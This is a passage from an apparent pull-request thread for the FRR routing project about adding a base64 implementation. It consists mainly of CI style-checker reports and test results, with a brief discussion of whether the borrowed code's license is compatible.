of a line\n    #176: FILE: /tmp/f1-24185/base64.c:176:\n    +    return ((len + 2) / 3 * 4) + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #181: FILE: /tmp/f1-24185/base64.c:181:\n    +    int i;$\n    \n    WARNING: please, no spaces at the start of a line\n    #182: FILE: /tmp/f1-24185/base64.c:182:\n    +    char *p;$\n    \n    WARNING: please, no spaces at the start of a line\n    #184: FILE: /tmp/f1-24185/base64.c:184:\n    +    p = encoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #185: FILE: /tmp/f1-24185/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #185: FILE: /tmp/f1-24185/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #186: FILE: /tmp/f1-24185/base64.c:186:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #187: FILE: /tmp/f1-24185/base64.c:187:\n    +    *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #188: FILE: /tmp/f1-24185/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #188: FILE: /tmp/f1-24185/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #189: FILE: /tmp/f1-24185/base64.c:189:\n    +    *p++ = basis_64[((string[i + 1] & 0xF) << 2) |$\n    \n    ERROR: code indent should use tabs where possible\n    #190: FILE: /tmp/f1-24185/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #190: FILE: /tmp/f1-24185/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #191: FILE: /tmp/f1-24185/base64.c:191:\n    +    *p++ = basis_64[string[i + 2] & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #192: FILE: /tmp/f1-24185/base64.c:192:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #193: FILE: /tmp/f1-24185/base64.c:193:\n    +    if (i < len) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #193: FILE: /tmp/f1-24185/base64.c:193:\n    +    if (i < len) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #194: FILE: /tmp/f1-24185/base64.c:194:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #195: FILE: /tmp/f1-24185/base64.c:195:\n    +    if (i == (len - 1)) {$\n    \n    ERROR: code indent should use tabs where possible\n    #196: FILE: /tmp/f1-24185/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #196: FILE: /tmp/f1-24185/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #197: FILE: /tmp/f1-24185/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #197: FILE: /tmp/f1-24185/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #198: FILE: /tmp/f1-24185/base64.c:198:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #199: FILE: /tmp/f1-24185/base64.c:199:\n    +    else {$\n    \n    ERROR: else should follow close brace '}'\n    #199: FILE: /tmp/f1-24185/base64.c:199:\n    +    }\n    +    else {\n    \n    ERROR: code indent should use tabs where possible\n    #200: FILE: /tmp/f1-24185/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    WARNING: please, no spaces at the start of a line\n    #200: FILE: /tmp/f1-24185/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #201: FILE: /tmp/f1-24185/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #201: FILE: /tmp/f1-24185/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #202: FILE: /tmp/f1-24185/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #202: FILE: /tmp/f1-24185/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #203: FILE: /tmp/f1-24185/base64.c:203:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #204: FILE: /tmp/f1-24185/base64.c:204:\n    +    *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #205: FILE: /tmp/f1-24185/base64.c:205:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #207: FILE: /tmp/f1-24185/base64.c:207:\n    +    *p++ = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #208: FILE: /tmp/f1-24185/base64.c:208:\n    +    return p - encoded;$\n    Report for base64.h | 35 issues\n    ===============================================\n    WARNING: Block comments should align the * on each line\n    #2: FILE: /tmp/f1-24185/base64.h:2:\n    +/*\n    +* Copyright (c) 2003 Apple Computer, Inc. All rights reserved.\n    \n    WARNING: Block comments should align the * on each line\n    #26: FILE: /tmp/f1-24185/base64.h:26:\n    +/* ====================================================================\n    +* Copyright (c) 1995-1999 The Apache Group.  All rights reserved.\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #92: FILE: /tmp/f1-24185/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n    \n    ERROR: space required after that ',' (ctx:VxV)\n    #92: FILE: /tmp/f1-24185/base64.h:92:\n    +int Base64encode(char * coded_dst, const char *plain_src,int len_plain_src);\n                                                             ^\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #94: FILE: /tmp/f1-24185/base64.h:94:\n    +int Base64decode_len(const char * coded_src);\n    \n    ERROR: \"foo * bar\" should be \"foo *bar\"\n    #95: FILE: /tmp/f1-24185/base64.h:95:\n    +int Base64decode(char * plain_dst, const char *coded_src);\n    \n    WARNING: adding a line without newline at end of file\n    #101: FILE: /tmp/f1-24185/base64.h:101:\n    +#endif //_BASE64_H_\n    \n    WARNING: C99 // comments do not match recommendation\n    #101: FILE: /tmp/f1-24185/base64.h:101:\n    +#endif //_BASE64_H_\n    Report for yang_wrappers.c | 6 issues\n    ===============================================\n    < WARNING: Missing a blank line after declarations\n    < #688: FILE: /tmp/f1-24185/yang_wrappers.c:688:\n    < WARNING: Missing a blank line after declarations\n    < #690: FILE: /tmp/f1-24185/yang_wrappers.c:690:\n    < WARNING: Missing a blank line after declarations\n    < #701: FILE: /tmp/f1-24185/yang_wrappers.c:701:\n\n</details>\n\n</details> > I have one comment to the code, please, check it. Other than that, I'm not sure we can just copy base64 implementation with another license to our code base. But I'm not an expert, so we'll need other people to check this out.\r\n\r\nI looked at other files in frr/lib. It seems there are a few third-party files, e.g., skiplist.h, which has a different license with others like defaults.h. Anyway, please let me know when you are sure about how to handle such new files. It's not as simple as `someone else is using a different license`  The license *must* be compatible with what we are using.  If it is not compatible then we will not accept it.  At this moment we are looking into figuring out if this license is compatible for us to allow this to integrate. > It's not as simple as `someone else is using a different license` The license _must_ be compatible with what we are using. If it is not compatible then we will not accept it. At this moment we are looking into figuring out if this license is compatible for us to allow this to integrate.\r\n\r\nSure. Let me know when you figure it out. Mixed messages at https://www.gnu.org/philosophy/apsl.en.html , but the recommendation is to avoid using it.\r\n\r\nI suggest we use a different implementation, ex:\r\n\r\nhttps://salsa.debian.org/alteholz/libb64/-/tree/master/\r\n\r\n  <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3396/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 1\n- Addresssanitizer topotests part 2\n- Topotests debian 10 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 amd64 part 5\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 2\n- Addresssanitizer topotests part 3\n- Topotests Ubuntu 18.04 amd64 part 7\n- Fedora 29 rpm pkg check\n- Topotests debian 10 amd64 part 5\n- Topotests Ubuntu 18.04 arm8 part 7\n- Topotests debian 10 amd64 part 0\n- Addresssanitizer topotests part 9\n- CentOS 7 rpm pkg check\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 2\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 amd64 part 3\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 i386 part 0\n- Topotests debian 10 amd64 part 7\n- Topotests debian 10 amd64 part 3\n- Topotests debian 10 amd64 part 8\n- Topotests Ubuntu 18.04 amd64 part 6\n- Addresssanitizer topotests part 0\n- Topotests Ubuntu 18.04 arm8 part 4\n- Ubuntu 20.04 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 9\n- Ubuntu 18.04 deb pkg check\n- Debian 10 deb pkg check\n- IPv6 protocols on Ubuntu 18.04\n- Addresssanitizer topotests part 1\n- Topotests Ubuntu 18.04 i386 part 4\n- IPv4 protocols on Ubuntu 18.04\n- Topotests Ubuntu 18.04 arm8 part 3\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests Ubuntu 18.04 i386 part 8\n- Debian 9 deb pkg check\n- Addresssanitizer topotests part 4\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests Ubuntu 18.04 amd64 part 9\n- Addresssanitizer topotests part 7\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 i386 part 9\n- Static analyzer (clang)\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 1\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 i386 part 6\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 amd64 part 8\n- IPv4 ldp protocol on Ubuntu 18.04\n- Ubuntu 16.04 deb pkg check\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n\n    <stdin>:87: trailing whitespace.\n     * \n    <stdin>:89: trailing whitespace.\n     * \n    <stdin>:96: trailing whitespace.\n     * \n    <stdin>:104: trailing whitespace.\n     * \n    warning: 4 lines add whitespace errors.\n    Report for base64.c | 213 issues\n    ===============================================\n    ERROR: trailing whitespace\n    #5: FILE: /tmp/f1-30676/base64.c:5:\n    + * $\n    \n    ERROR: trailing whitespace\n    #7: FILE: /tmp/f1-30676/base64.c:7:\n    + * $\n    \n    ERROR: trailing whitespace\n    #14: FILE: /tmp/f1-30676/base64.c:14:\n    + * $\n    \n    ERROR: trailing whitespace\n    #22: FILE: /tmp/f1-30676/base64.c:22:\n    + * $\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-30676/base64.c:91:\n    +static const unsigned char pr2six[256] =\n    +{\n    \n    WARNING: please, no spaces at the start of a line\n    #93: FILE: /tmp/f1-30676/base64.c:93:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #94: FILE: /tmp/f1-30676/base64.c:94:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #95: FILE: /tmp/f1-30676/base64.c:95:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,$\n    \n    WARNING: please, no spaces at the start of a line\n    #96: FILE: /tmp/f1-30676/base64.c:96:\n    +    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #97: FILE: /tmp/f1-30676/base64.c:97:\n    +    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,$\n    \n    WARNING: please, no spaces at the start of a line\n    #98: FILE: /tmp/f1-30676/base64.c:98:\n    +    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #99: FILE: /tmp/f1-30676/base64.c:99:\n    +    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,$\n    \n    WARNING: please, no spaces at the start of a line\n    #100: FILE: /tmp/f1-30676/base64.c:100:\n    +    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #101: FILE: /tmp/f1-30676/base64.c:101:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #102: FILE: /tmp/f1-30676/base64.c:102:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #103: FILE: /tmp/f1-30676/base64.c:103:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #104: FILE: /tmp/f1-30676/base64.c:104:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #105: FILE: /tmp/f1-30676/base64.c:105:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #106: FILE: /tmp/f1-30676/base64.c:106:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #107: FILE: /tmp/f1-30676/base64.c:107:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #108: FILE: /tmp/f1-30676/base64.c:108:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64$\n    \n    WARNING: please, no spaces at the start of a line\n    #113: FILE: /tmp/f1-30676/base64.c:113:\n    +    int nbytesdecoded;$\n    \n    WARNING: Missing a blank line after declarations\n    #114: FILE: /tmp/f1-30676/base64.c:114:\n    +    int nbytesdecoded;\n    +    register const unsigned char *bufin;\n    \n    WARNING: please, no spaces at the start of a line\n    #114: FILE: /tmp/f1-30676/base64.c:114:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #115: FILE: /tmp/f1-30676/base64.c:115:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #117: FILE: /tmp/f1-30676/base64.c:117:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #118: FILE: /tmp/f1-30676/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #118: FILE: /tmp/f1-30676/base64.c:118:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #120: FILE: /tmp/f1-30676/base64.c:120:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #121: FILE: /tmp/f1-30676/base64.c:121:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #123: FILE: /tmp/f1-30676/base64.c:123:\n    +    return nbytesdecoded + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #128: FILE: /tmp/f1-30676/base64.c:128:\n    +    int nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #129: FILE: /tmp/f1-30676/base64.c:129:\n    +    register const unsigned char *bufin;$\n    \n    WARNING: please, no spaces at the start of a line\n    #130: FILE: /tmp/f1-30676/base64.c:130:\n    +    register unsigned char *bufout;$\n    \n    WARNING: please, no spaces at the start of a line\n    #131: FILE: /tmp/f1-30676/base64.c:131:\n    +    register int nprbytes;$\n    \n    WARNING: please, no spaces at the start of a line\n    #133: FILE: /tmp/f1-30676/base64.c:133:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #134: FILE: /tmp/f1-30676/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);$\n    \n    ERROR: trailing statements should be on next line\n    #134: FILE: /tmp/f1-30676/base64.c:134:\n    +    while (pr2six[*(bufin++)] <= 63);\n    \n    WARNING: please, no spaces at the start of a line\n    #135: FILE: /tmp/f1-30676/base64.c:135:\n    +    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #136: FILE: /tmp/f1-30676/base64.c:136:\n    +    nbytesdecoded = ((nprbytes + 3) / 4) * 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #138: FILE: /tmp/f1-30676/base64.c:138:\n    +    bufout = (unsigned char *) bufplain;$\n    \n    WARNING: please, no spaces at the start of a line\n    #139: FILE: /tmp/f1-30676/base64.c:139:\n    +    bufin = (const unsigned char *) bufcoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #141: FILE: /tmp/f1-30676/base64.c:141:\n    +    while (nprbytes > 4) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #141: FILE: /tmp/f1-30676/base64.c:141:\n    +    while (nprbytes > 4) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #142: FILE: /tmp/f1-30676/base64.c:142:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #143: FILE: /tmp/f1-30676/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #143: FILE: /tmp/f1-30676/base64.c:143:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #144: FILE: /tmp/f1-30676/base64.c:144:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #145: FILE: /tmp/f1-30676/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #145: FILE: /tmp/f1-30676/base64.c:145:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #146: FILE: /tmp/f1-30676/base64.c:146:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #147: FILE: /tmp/f1-30676/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #147: FILE: /tmp/f1-30676/base64.c:147:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #148: FILE: /tmp/f1-30676/base64.c:148:\n    +    bufin += 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #149: FILE: /tmp/f1-30676/base64.c:149:\n    +    nprbytes -= 4;$\n    \n    WARNING: please, no spaces at the start of a line\n    #150: FILE: /tmp/f1-30676/base64.c:150:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #153: FILE: /tmp/f1-30676/base64.c:153:\n    +    if (nprbytes > 1) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #153: FILE: /tmp/f1-30676/base64.c:153:\n    +    if (nprbytes > 1) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #154: FILE: /tmp/f1-30676/base64.c:154:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #155: FILE: /tmp/f1-30676/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #155: FILE: /tmp/f1-30676/base64.c:155:\n    +        (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);$\n    \n    WARNING: please, no spaces at the start of a line\n    #156: FILE: /tmp/f1-30676/base64.c:156:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #157: FILE: /tmp/f1-30676/base64.c:157:\n    +    if (nprbytes > 2) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #157: FILE: /tmp/f1-30676/base64.c:157:\n    +    if (nprbytes > 2) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #158: FILE: /tmp/f1-30676/base64.c:158:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #159: FILE: /tmp/f1-30676/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #159: FILE: /tmp/f1-30676/base64.c:159:\n    +        (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);$\n    \n    WARNING: please, no spaces at the start of a line\n    #160: FILE: /tmp/f1-30676/base64.c:160:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #161: FILE: /tmp/f1-30676/base64.c:161:\n    +    if (nprbytes > 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #161: FILE: /tmp/f1-30676/base64.c:161:\n    +    if (nprbytes > 3) {\n    +    *(bufout++) =\n    \n    WARNING: please, no spaces at the start of a line\n    #162: FILE: /tmp/f1-30676/base64.c:162:\n    +    *(bufout++) =$\n    \n    ERROR: code indent should use tabs where possible\n    #163: FILE: /tmp/f1-30676/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #163: FILE: /tmp/f1-30676/base64.c:163:\n    +        (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);$\n    \n    WARNING: please, no spaces at the start of a line\n    #164: FILE: /tmp/f1-30676/base64.c:164:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #166: FILE: /tmp/f1-30676/base64.c:166:\n    +    *(bufout++) = '\\0';$\n    \n    WARNING: please, no spaces at the start of a line\n    #167: FILE: /tmp/f1-30676/base64.c:167:\n    +    nbytesdecoded -= (4 - nprbytes) & 3;$\n    \n    WARNING: please, no spaces at the start of a line\n    #168: FILE: /tmp/f1-30676/base64.c:168:\n    +    return nbytesdecoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #172: FILE: /tmp/f1-30676/base64.c:172:\n    +    \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";$\n    \n    WARNING: please, no spaces at the start of a line\n    #176: FILE: /tmp/f1-30676/base64.c:176:\n    +    return ((len + 2) / 3 * 4) + 1;$\n    \n    WARNING: please, no spaces at the start of a line\n    #181: FILE: /tmp/f1-30676/base64.c:181:\n    +    int i;$\n    \n    WARNING: please, no spaces at the start of a line\n    #182: FILE: /tmp/f1-30676/base64.c:182:\n    +    char *p;$\n    \n    WARNING: please, no spaces at the start of a line\n    #184: FILE: /tmp/f1-30676/base64.c:184:\n    +    p = encoded;$\n    \n    WARNING: please, no spaces at the start of a line\n    #185: FILE: /tmp/f1-30676/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #185: FILE: /tmp/f1-30676/base64.c:185:\n    +    for (i = 0; i < len - 2; i += 3) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #186: FILE: /tmp/f1-30676/base64.c:186:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #187: FILE: /tmp/f1-30676/base64.c:187:\n    +    *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #188: FILE: /tmp/f1-30676/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #188: FILE: /tmp/f1-30676/base64.c:188:\n    +                    ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #189: FILE: /tmp/f1-30676/base64.c:189:\n    +    *p++ = basis_64[((string[i + 1] & 0xF) << 2) |$\n    \n    ERROR: code indent should use tabs where possible\n    #190: FILE: /tmp/f1-30676/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #190: FILE: /tmp/f1-30676/base64.c:190:\n    +                    ((int) (string[i + 2] & 0xC0) >> 6)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #191: FILE: /tmp/f1-30676/base64.c:191:\n    +    *p++ = basis_64[string[i + 2] & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #192: FILE: /tmp/f1-30676/base64.c:192:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #193: FILE: /tmp/f1-30676/base64.c:193:\n    +    if (i < len) {$\n    \n    WARNING: suspect code indent for conditional statements (4, 4)\n    #193: FILE: /tmp/f1-30676/base64.c:193:\n    +    if (i < len) {\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];\n    \n    WARNING: please, no spaces at the start of a line\n    #194: FILE: /tmp/f1-30676/base64.c:194:\n    +    *p++ = basis_64[(string[i] >> 2) & 0x3F];$\n    \n    WARNING: please, no spaces at the start of a line\n    #195: FILE: /tmp/f1-30676/base64.c:195:\n    +    if (i == (len - 1)) {$\n    \n    ERROR: code indent should use tabs where possible\n    #196: FILE: /tmp/f1-30676/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #196: FILE: /tmp/f1-30676/base64.c:196:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #197: FILE: /tmp/f1-30676/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #197: FILE: /tmp/f1-30676/base64.c:197:\n    +        *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #198: FILE: /tmp/f1-30676/base64.c:198:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #199: FILE: /tmp/f1-30676/base64.c:199:\n    +    else {$\n    \n    ERROR: else should follow close brace '}'\n    #199: FILE: /tmp/f1-30676/base64.c:199:\n    +    }\n    +    else {\n    \n    ERROR: code indent should use tabs where possible\n    #200: FILE: /tmp/f1-30676/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    WARNING: please, no spaces at the start of a line\n    #200: FILE: /tmp/f1-30676/base64.c:200:\n    +        *p++ = basis_64[((string[i] & 0x3) << 4) |$\n    \n    ERROR: code indent should use tabs where possible\n    #201: FILE: /tmp/f1-30676/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #201: FILE: /tmp/f1-30676/base64.c:201:\n    +                        ((int) (string[i + 1] & 0xF0) >> 4)];$\n    \n    ERROR: code indent should use tabs where possible\n    #202: FILE: /tmp/f1-30676/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #202: FILE: /tmp/f1-30676/base64.c:202:\n    +        *p++ = basis_64[((string[i + 1] & 0xF) << 2)];$\n    \n    WARNING: please, no spaces at the start of a line\n    #203: FILE: /tmp/f1-30676/base64.c:203:\n    +    }$\n    \n    WARNING: please, no spaces at the start of a line\n    #204: FILE: /tmp/f1-30676/base64.c:204:\n    +    *p++ = '=';$\n    \n    WARNING: please, no spaces at the start of a line\n    #205: FILE: /tmp/f1-30676/base64.c:205:\n    +    }$\n    \n    